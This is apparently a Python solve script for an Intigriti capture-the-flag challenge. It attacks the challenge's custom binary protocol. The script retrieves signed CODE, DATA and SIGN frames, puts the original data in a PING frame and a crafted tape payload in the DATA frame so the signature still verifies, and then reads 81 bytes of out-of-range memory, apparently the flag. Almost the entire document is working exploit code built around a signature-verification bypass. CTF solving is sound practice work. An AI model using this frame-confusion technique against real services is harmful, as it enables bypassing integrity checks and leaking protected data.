import requests

URL = "https://challenge-1126.challenges.intigriti.io/custom_protocol"

SECRET = (
    b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_"
    b"1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"
)


def frame(cmd, payload=b""):
    return b"w" + len(payload).to_bytes(4, "little") + cmd + payload


def parse_frames(raw):
    result, pos = {}, 0
    while True:
        pos = raw.find(b"w", pos)
        if pos < 0 or pos + 9 > len(raw):
            break
        length = int.from_bytes(raw[pos + 1 : pos + 5], "little")
        end = pos + 5 + length
        if length < 4 or end > len(raw):
            pos += 1
            continue
        result[raw[pos + 5 : pos + 9]] = raw[pos + 9 : end]
        pos = end
    return result


# Retrieve original signed components.
r = requests.post(URL, data=SECRET + frame(b"HELP"))
r.raise_for_status()
parts = parse_frames(r.content)

code, data, sign = parts[b"CODE"], parts[b"DATA"], parts[b"SIGN"]

# Read 81 bytes starting 256 bytes from the interpreter's tape origin.
exploit = (b">" * 256 + b".>" * 81).ljust(len(data), b"\x00")

# Original DATA is placed in PING; modified DATA is executed.
body = SECRET + b"".join(
    [
        frame(b"CODE", code),
        frame(b"PING", data),
        frame(b"DATA", exploit),
        frame(b"SIGN", sign),
        frame(b"EXEC"),
    ]
)

r = requests.post(URL, data=body)
r.raise_for_status()

marker = b"ACK\x00ACK\x00PONGACK\x00ACK\x00"
print(r.content.split(marker, 1)[1][:81].rstrip(b"\x00").decode())
